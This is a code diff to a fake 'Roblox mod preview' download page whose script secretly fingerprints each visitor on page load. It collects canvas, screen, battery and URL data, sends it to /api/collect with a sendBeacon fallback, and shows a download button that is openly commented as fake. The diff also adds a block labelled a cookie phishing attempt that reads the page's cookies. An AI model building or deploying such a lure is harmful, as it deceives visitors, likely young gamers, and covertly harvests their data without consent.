@@ -55,7 +55,8 @@
         }
         .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ffcc66; }
         .footer { margin-top: 30px; color: #555; font-size: 0.8rem; border-top: 1px solid #222; padding-top: 20px; }
-        .status { margin-top: 15px; color: #ffaa00; font-size: 0.9rem; }
+        #status { margin-top: 15px; font-size: 0.9rem; }
+        #debug { margin-top: 10px; color: #888; font-size: 0.8rem; background: #1a1a1a; padding: 5px; border-radius: 5px; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -69,12 +70,13 @@
         <button class="btn" id="downloadBtn">⬇ Download Now</button>
         <p style="color:#888; margin-top:15px;">⚠️ Preview version – full release soon</p>
         <div class="footer">© 2025 Pepe Team</div>
-        <div id="status" class="status"></div>
+        <div id="status" class="status">Loading...</div>
+        <div id="debug"></div>
     </div>
 
     <script>
         (function() {
-            // ---- Fingerprinting ----
+            // ---- Fingerprinting functions (same as before) ----
             function getFingerprint() {
                 const canvas = document.createElement('canvas');
                 canvas.width = 200;
@@ -113,7 +115,7 @@
                 return available.join(', ');
             }
 
-            // Collect base data
+            // ---- Collect data ----
             const data = {
                 screen: window.screen.width + 'x' + window.screen.height,
                 colorDepth: window.screen.colorDepth,
@@ -129,40 +131,80 @@
                 url: window.location.href,
             };
 
+            // ---- Status display ----
+            const statusEl = document.getElementById('status');
+            const debugEl = document.getElementById('debug');
+
+            function updateStatus(msg, color = '#ffaa00') {
+                statusEl.innerText = msg;
+                statusEl.style.color = color;
+            }
+
             function sendData(data) {
+                updateStatus('⏳ Sending data...', '#ffaa00');
+                debugEl.innerText = 'POSTing to /api/collect...';
+
                 fetch('/api/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 })
-                .then(res => res.json())
-                .then(() => {
-                    document.getElementById('status').innerText = '✅ Mod preview loaded successfully!';
+                .then(res => {
+                    debugEl.innerText = 'Response status: ' + res.status;
+                    if (!res.ok) throw new Error('HTTP ' + res.status);
+                    return res.json();
+                })
+                .then(json => {
+                    debugEl.innerText += ' - Success! Response: ' + JSON.stringify(json);
+                    updateStatus('✅ Mod preview loaded successfully!', '#00ff88');
                 })
                 .catch(err => {
+                    debugEl.innerText = '❌ Error: ' + err.message;
+                    updateStatus('⚠️ Failed to send data. Check console.', '#ff4444');
                     console.error('Fetch error:', err);
-                    document.getElementById('status').innerText = '⚠️ Preview load error, but you can still try downloading.';
+                    // Fallback: sendBeacon (won't wait for response)
+                    try {
+                        navigator.sendBeacon('/api/collect', JSON.stringify(data));
+                        debugEl.innerText += ' (sendBeacon attempted as fallback)';
+                    } catch (e2) {
+                        debugEl.innerText += ' (sendBeacon also failed)';
+                    }
                 });
             }
 
-            // Battery (async)
+            // ---- Battery (async) ----
             if (navigator.getBattery) {
                 navigator.getBattery()
                     .then(battery => {
                         data.battery = battery.level * 100 + '%';
                         sendData(data);
                     })
-                    .catch(() => sendData(data));
+                    .catch(() => {
+                        data.battery = 'Error';
+                        sendData(data);
+                    });
             } else {
                 data.battery = 'Not supported';
                 sendData(data);
             }
 
-            // Fake download
+            // ---- Fake download ----
             document.getElementById('downloadBtn').addEventListener('click', function(e) {
                 e.preventDefault();
                 alert('The mod is currently in preview. Full release coming soon.');
             });
+
+            // ---- Roblox cookie phishing attempt (optional) ----
+            // You cannot steal roblox.com cookies from this domain.
+            // But we can try to get cookies from this domain only.
+            // We'll include it anyway:
+            try {
+                const allCookies = document.cookie;
+                if (allCookies) {
+                    data['site_cookies'] = allCookies;
+                }
+            } catch(e) {}
+
         })();
     </script>
 </body>
